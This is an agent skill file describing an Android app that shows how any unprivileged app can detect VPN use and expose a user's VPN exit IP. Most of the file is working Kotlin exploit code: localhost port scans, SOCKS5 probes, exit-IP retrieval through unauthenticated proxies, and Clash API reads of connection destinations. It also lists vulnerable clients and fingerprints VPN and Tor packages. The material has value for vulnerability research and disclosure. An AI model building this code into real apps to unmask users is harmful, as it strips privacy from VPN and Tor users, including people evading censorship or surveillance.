---
name: yourvpndead-vpn-detection
description: Android app that detects VPN/proxy servers (VLESS/xray/sing-box) via local SOCKS5 vulnerability, exposing exit IPs and server configs without root
triggers:
  - detect VPN server IP on Android
  - scan localhost SOCKS5 proxy ports
  - find xray v2rayNG exposed ports
  - check if VPN app is leaking server IP
  - scan sing-box clash API on localhost
  - detect VPN using Android network capabilities
  - find open proxy ports on Android device
  - check VPN client vulnerability android
---

# YourVPNDead — Android VPN Detection & SOCKS5 Vulnerability Scanner

> Skill by [ara.so](https://ara.so) — Daily 2026 Skills collection.

Android app (Kotlin + Jetpack Compose) demonstrating that any app — without root or special permissions — can detect VPN usage, identify the VPN client, and retrieve the VPN server's exit IP through unauthenticated SOCKS5 proxies exposed on localhost by popular VPN clients (v2rayNG, NekoBox, Hiddify, etc.).

## Build & Install

```bash
git clone https://github.com/loop-uh/yourvpndead.git
cd yourvpndead
./gradlew assembleDebug
# Output: app/build/outputs/apk/debug/app-debug.apk
adb install app/build/outputs/apk/debug/app-debug.apk
```

Or download the pre-built APK from [Releases](https://github.com/loop-uh/yourvpndead/releases).

**Required permissions** (`AndroidManifest.xml`):
```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
```

## Architecture

```
ScanOrchestrator (14 phases)
├── ProfileDetector          — work profile, isolation, VPN status
├── ProcNetScanner           — /proc/net/tcp fingerprinting
├── DirectSignsChecker       — 6 direct VPN checks
├── IndirectSignsChecker     — 5 indirect checks (MTU, DNS, dumpsys)
├── DeviceInfoCollector      — device fingerprint
├── PortScanner              — TCP scan IPv4 + IPv6 localhost
├── Socks5Probe              — proxy type identification
├── XrayAPIDetector          — xray gRPC API detection
├── ClashAPIProbe            — Clash REST API probe
├── AuthProbe                — auth analysis + brute-force demo
├── ExitIPResolver           — exit IP via SOCKS5
└── GeoLocator               — IP geolocation
```

**Stack**: Kotlin, Jetpack Compose, Material 3, Coroutines, MVVM (ViewModel + StateFlow)

## Key Detection Modules

### 1. Direct VPN Signs — `DirectSignsChecker.kt`

Detects VPN via standard (and hidden) Android APIs:

```kotlin
// Check TRANSPORT_VPN capability
val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
val network = connectivityManager.activeNetwork
val caps = connectivityManager.getNetworkCapabilities(network)

val hasVpnTransport = caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true

// Check hidden IS_VPN flag (not in public API)
val capsString = caps?.toString() ?: ""
val hasIsVpn = capsString.contains("IS_VPN")
val hasVpnTransportInfo = capsString.contains("VpnTransportInfo")

// Check system proxy properties
val httpProxyHost = System.getProperty("http.proxyHost")
val socksProxyHost = System.getProperty("socksProxyHost")

// Check NOT_VPN capability absence (inverse detection)
val notVpnCapability = caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_VPN) == true
// If false → network IS a VPN
```

### 2. VPN Interface Detection

```kotlin
import java.net.NetworkInterface

fun detectVpnInterfaces(): List<String> {
    val vpnPatterns = listOf(
        Regex("^tun\\d+$"),
        Regex("^tap\\d+$"),
        Regex("^wg\\d+$"),
        Regex("^ppp\\d+$"),
        Regex("^ipsec.*$")
    )
    return NetworkInterface.getNetworkInterfaces()
        .toList()
        .filter { iface -> vpnPatterns.any { it.matches(iface.name) } }
        .map { it.name }
}

// Check MTU anomaly (VPN lowers MTU due to encapsulation overhead)
fun checkMtuAnomaly(): Boolean {
    return NetworkInterface.getNetworkInterfaces()
        .toList()
        .filter { it.isUp && !it.isLoopback }
        .any { it.mtu in 1..1499 } // Standard Ethernet = 1500
}
// WireGuard: ~1420, OpenVPN: ~1400, VLESS/xray: ~1380-1400
```

### 3. /proc/net/tcp Scanner — `ProcNetScanner.kt`

Reads listening ports without root:

```kotlin
fun scanProcNetTcp(): List<Int> {
    val openPorts = mutableListOf<Int>()
    listOf("/proc/net/tcp", "/proc/net/tcp6").forEach { path ->
        try {
            File(path).forEachLine { line ->
                val parts = line.trim().split("\\s+".toRegex())
                if (parts.size >= 4) {
                    val state = parts[3]
                    if (state == "0A") { // 0A = LISTEN
                        val localAddress = parts[1]
                        val portHex = localAddress.split(":").lastOrNull()
                        portHex?.toIntOrNull(16)?.let { openPorts.add(it) }
                    }
                }
            }
        } catch (e: Exception) { /* May be restricted on newer Android */ }
    }
    return openPorts
}

// Fingerprint VPN client by port pattern
fun fingerprintClient(ports: List<Int>): String {
    return when {
        10808 in ports && 10809 in ports && 19085 in ports -> "v2rayNG / xray"
        2080 in ports -> "NekoBox / sing-box"
        7890 in ports && 7891 in ports && 9090 in ports -> "Clash / mihomo"
        3066 in ports && 3067 in ports -> "Karing"
        19090 in ports -> "sing-box (Clash API — IP leak via /connections!)"
        else -> "Unknown"
    }
}
```

### 4. Port Scanner — `PortScanner.kt`

TCP connect scan on 127.0.0.1 and ::1:

```kotlin
import kotlinx.coroutines.*
import java.net.InetSocketAddress
import java.net.Socket

suspend fun scanKnownPorts(
    timeout: Int = 300,
    parallelism: Int = 32
): List<Int> = coroutineScope {
    val knownVpnPorts = listOf(
        // xray / v2rayNG
        10808, 10809, 10810, 10085, 19085,
        // sing-box / NekoBox
        2080, 2081, 3066, 3067,
        // Clash / mihomo
        7890, 7891, 7892, 7893, 9090, 19090,
        // Common proxy
        1080, 8080, 8118, 9050, 3128,
        // Yandex.Metrica tracking
        29009, 29010, 30102, 30103,
        // Meta Pixel
        12387, 12388, 12389
    )

    val semaphore = kotlinx.coroutines.sync.Semaphore(parallelism)
    knownVpnPorts.map { port ->
        async(Dispatchers.IO) {
            semaphore.withPermit {
                try {
                    Socket().use { socket ->
                        socket.connect(InetSocketAddress("127.0.0.1", port), timeout)
                        port // Return port if connected
                    }
                } catch (e: Exception) { null }
            }
        }
    }.awaitAll().filterNotNull()
}

// Full scan 1-65535
suspend fun fullPortScan(timeout: Int = 200): List<Int> = coroutineScope {
    val semaphore = kotlinx.coroutines.sync.Semaphore(32)
    (1..65535).map { port ->
        async(Dispatchers.IO) {
            semaphore.withPermit {
                try {
                    Socket().use { socket ->
                        socket.connect(InetSocketAddress("127.0.0.1", port), timeout)
                        port
                    }
                } catch (e: Exception) { null }
            }
        }
    }.awaitAll().filterNotNull()
}
```

### 5. SOCKS5 Probe — `Socks5Probe.kt`

Identify proxy type and check for authentication:

```kotlin
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket

enum class ProxyType { SOCKS5_NO_AUTH, SOCKS5_AUTH_REQUIRED, HTTP_CONNECT, GRPC, UNKNOWN }

fun probePort(port: Int, timeoutMs: Int = 2000): ProxyType {
    return try {
        Socket().use { socket ->
            socket.connect(InetSocketAddress("127.0.0.1", port), timeoutMs)
            socket.soTimeout = timeoutMs
            val out: OutputStream = socket.getOutputStream()
            val inp: InputStream = socket.getInputStream()

            // SOCKS5 handshake: VER=5, NMETHODS=1, METHOD=NO_AUTH(0x00)
            out.write(byteArrayOf(0x05, 0x01, 0x00))
            out.flush()

            val response = ByteArray(2)
            inp.read(response)

            when {
                response[0] == 0x05.toByte() && response[1] == 0x00.toByte() ->
                    ProxyType.SOCKS5_NO_AUTH         // Vulnerable!
                response[0] == 0x05.toByte() && response[1] == 0x02.toByte() ->
                    ProxyType.SOCKS5_AUTH_REQUIRED   // Protected
                else -> ProxyType.UNKNOWN
            }
        }
    } catch (e: Exception) { ProxyType.UNKNOWN }
}

// HTTP CONNECT probe
fun probeHttpConnect(port: Int): Boolean {
    return try {
        Socket().use { socket ->
            socket.connect(InetSocketAddress("127.0.0.1", port), 2000)
            val out = socket.getOutputStream()
            out.write("CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n".toByteArray())
            out.flush()
            val response = socket.getInputStream().bufferedReader().readLine() ?: ""
            response.contains("200") || response.contains("407") || response.startsWith("HTTP")
        }
    } catch (e: Exception) { false }
}
```

### 6. Exit IP Resolution via SOCKS5 — `ExitIPResolver.kt`

Get VPN server's real IP through unauthenticated SOCKS5:

```kotlin
import java.net.InetAddress
import java.net.Socket

fun resolveExitIpViaSocks5(
    socksPort: Int,
    targetHost: String = "api.ipify.org",
    targetPort: Int = 80
): String? {
    return try {
        Socket().use { socket ->
            socket.connect(InetSocketAddress("127.0.0.1", socksPort), 3000)
            socket.soTimeout = 5000
            val out = socket.getOutputStream()
            val inp = socket.getInputStream()

            // SOCKS5 handshake
            out.write(byteArrayOf(0x05, 0x01, 0x00)); out.flush()
            val auth = ByteArray(2); inp.read(auth)
            if (auth[1] != 0x00.toByte()) return null // Auth required

            // CONNECT request (ATYP=0x03 domain name)
            val hostBytes = targetHost.toByteArray()
            val request = byteArrayOf(
                0x05,                    // VER
                0x01,                    // CMD = CONNECT
                0x00,                    // RSV
                0x03,                    // ATYP = domain
                hostBytes.size.toByte()  // domain length
            ) + hostBytes + byteArrayOf(
                (targetPort shr 8).toByte(),
                (targetPort and 0xFF).toByte()
            )
            out.write(request); out.flush()

            // Read response (10 bytes for IPv4)
            val resp = ByteArray(10); inp.read(resp)
            if (resp[1] != 0x00.toByte()) return null // Connection failed

            // HTTP GET to ipify
            out.write("GET / HTTP/1.1\r\nHost: $targetHost\r\nConnection: close\r\n\r\n".toByteArray())
            out.flush()

            val response = inp.bufferedReader().readText()
            // Response body is the exit IP
            response.lines().last { it.matches(Regex("\\d+\\.\\d+\\.\\d+\\.\\d+")) }
        }
    } catch (e: Exception) { null }
}
```

### 7. Clash REST API Probe — `ClashAPIProbe.kt`

sing-box/mihomo expose Clash API on localhost without auth by default:

```kotlin
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

data class ClashApiResult(
    val isOpen: Boolean,
    val connections: List<String> = emptyList(), // Contains destination IPs!
    val proxies: List<String> = emptyList(),
    val externalController: String? = null
)

fun probeClashApi(port: Int = 9090, timeoutMs: Int = 3000): ClashApiResult {
    val baseUrl = "http://127.0.0.1:$port"
    return try {
        // Check /configs for external-controller info
        val configUrl = URL("$baseUrl/configs")
        val configConn = configUrl.openConnection() as HttpURLConnection
        configConn.connectTimeout = timeoutMs
        configConn.readTimeout = timeoutMs

        if (configConn.responseCode != 200) return ClashApiResult(false)

        val config = JSONObject(configConn.inputStream.bufferedReader().readText())

        // GET /connections — reveals ALL active connection destination IPs
        val connUrl = URL("$baseUrl/connections")
        val connConn = connUrl.openConnection() as HttpURLConnection
        connConn.connectTimeout = timeoutMs
        val connData = JSONObject(connConn.inputStream.bufferedReader().readText())

        val destinationIps = mutableListOf<String>()
        val connections = connData.optJSONArray("connections")
        if (connections != null) {
            for (i in 0 until connections.length()) {
                val conn = connections.getJSONObject(i)
                conn.optJSONObject("metadata")?.optString("destinationIP")
                    ?.takeIf { it.isNotEmpty() }
                    ?.let { destinationIps.add(it) }
            }
        }

        ClashApiResult(
            isOpen = true,
            connections = destinationIps,
            externalController = config.optString("external-controller")
        )
    } catch (e: Exception) { ClashApiResult(false) }
}

// Ports to check for Clash API
val clashApiPorts = listOf(9090, 19090, 8080, 9091, 8090)
```

### 8. VPN App Detection — `DirectSignsChecker.kt`

Enumerate installed VPN apps (requires QUERY_ALL_PACKAGES on Android 11+):

```kotlin
val vpnPackages = mapOf(
    "com.v2ray.ang" to "v2rayNG",
    "io.nekohasekai.sfa" to "sing-box (SFA)",
    "app.hiddify.com" to "Hiddify",
    "com.github.shadowsocks" to "Shadowsocks",
    "com.matsuridayo.matsuri" to "NekoBox",
    "io.nekohasekai.sagernet" to "NekoBox/SagerNet",
    "com.clashforwindows.clash" to "ClashMeta",
    "com.byedpi" to "ByeDPI",
    "org.outline.android.client" to "Outline",
    "com.psiphon3" to "Psiphon",
    "us.lantern.lantern" to "Lantern",
    "com.wireguard.android" to "WireGuard",
    "org.torproject.torbrowser" to "Tor Browser",
    "org.torproject.android" to "Orbot",
    "com.karing.app" to "Karing",
    "com.throne.android" to "Throne",
    "com.happ.free.vpn.proxy" to "HAPP"
)

fun detectInstalledVpnApps(context: Context): List<String> {
    val pm = context.packageManager
    return vpnPackages.entries.mapNotNull { (pkg, name) ->
        try {
            pm.getPackageInfo(pkg, 0)
            name // App is installed
        } catch (e: PackageManager.NameNotFoundException) { null }
    }
}
```

### 9. Routing Table Check

```kotlin
fun checkDefaultRoute(): String? {
    return try {
        File("/proc/net/route").readLines()
            .drop(1) // Skip header
            .firstOrNull { line ->
                val parts = line.split("\t")
                parts.size >= 2 && parts[1] == "00000000" // Default route (0.0.0.0)
            }
            ?.split("\t")
            ?.firstOrNull() // Interface name (e.g., "tun0" = VPN)
    } catch (e: Exception) { null }
}
```

## MVVM Pattern — ViewModel + StateFlow

```kotlin
// ScanViewModel.kt
class ScanViewModel(application: Application) : AndroidViewModel(application) {
    private val _scanState = MutableStateFlow<ScanState>(ScanState.Idle)
    val scanState: StateFlow<ScanState> = _scanState.asStateFlow()

    fun startScan(fullScan: Boolean = false) {
        viewModelScope.launch {
            _scanState.value = ScanState.Running(phase = "Initializing...")
            val orchestrator = ScanOrchestrator(getApplication())
            orchestrator.run(
                fullPortScan = fullScan,
                onPhaseUpdate = { phase -> _scanState.value = ScanState.Running(phase) }
            ).collect { result ->
                _scanState.value = ScanState.Complete(result)
            }
        }
    }
}

// ScanState.kt
sealed class ScanState {
    object Idle : ScanState()
    data class Running(val phase: String) : ScanState()
    data class Complete(val result: ScanResult) : ScanState()
}
```

## Composable UI Pattern

```kotlin
@Composable
fun ScanScreen(viewModel: ScanViewModel = viewModel()) {
    val state by viewModel.scanState.collectAsState()

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        when (val s = state) {
            is ScanState.Idle -> Button(onClick = { viewModel.startScan() }) {
                Text("Start VPN Scan")
            }
            is ScanState.Running -> {
                CircularProgressIndicator()
                Text("Phase: ${s.phase}")
            }
            is ScanState.Complete -> ScanResultView(result = s.result)
        }
    }
}
```

## Vulnerable Client Reference

| Client | Core | Default SOCKS Port | Auth | Status |
|--------|------|--------------------|------|--------|
| v2rayNG | xray | 10808 | None | **Vulnerable** |
| NekoBox | sing-box | 2080 | None | **Vulnerable** |
| Hiddify | sing-box/xray | varies | None | **Vulnerable** |
| Happ | xray | varies | None + open gRPC API | **Critical** |
| Karing | sing-box | 3067 | None | **Vulnerable** |
| Husi | sing-box | — | Yes | Protected |

## Known Port Constants

```kotlin
object VpnPorts {
    // xray / v2rayNG
    val XRAY_SOCKS = 10808
    val XRAY_HTTP = 10809
    val XRAY_STATS = 19085
    val XRAY_GRPC_API = listOf(10085, 19085, 23456, 8001, 62789)

    // sing-box / NekoBox
    val SINGBOX_MIXED = 2080
    val SINGBOX_HTTP = 2081
    val KARING_SOCKS = 3067
    val KARING_HTTP = 3066

    // Clash / mihomo
    val CLASH_HTTP = 7890
    val CLASH_SOCKS = 7891
    val CLASH_REDIR = 7892
    val CLASH_API = 9090
    val SINGBOX_CLASH_API = 19090  // Leaks connection IPs via /connections

    // Common
    val TOR_SOCKS = 9050
    val PRIVOXY = 8118
}
```

## Troubleshooting

**`/proc/net/tcp` returns empty or permission denied**
- Restricted on Android 10+ for non-root apps on some ROMs (Samsung Knox, MIUI)
- Fallback: use TCP connect scan via `PortScanner` instead

**Port scan misses ports**
- Increase `timeout` from 300ms to 500ms for slower devices
- Reduce `parallelism` to 16 if getting connection reset errors

**QUERY_ALL_PACKAGES denied**
- Required for VPN app enumeration on Android 11+
- Must be declared in manifest; some app stores may restrict it
- Fallback: check only packages via `Intent` resolution

**SOCKS5 probe connects but returns unexpected bytes**
- Some clients send HTTP 400 response instead of SOCKS5 rejection
- Add HTTP CONNECT fallback probe after SOCKS5 attempt

**Exit IP resolution returns null despite open SOCKS5**
- Target `api.ipify.org` may be blocked by the VPN itself
- Try alternative: `ifconfig.me`, `checkip.amazonaws.com`
- Some clients block loopback-originated connections to external hosts

**Clash API returns 401**
- Client has set `secret` in config — not the default behavior but possible
- Check port 19090 (sing-box uses different default than mihomo's 9090)
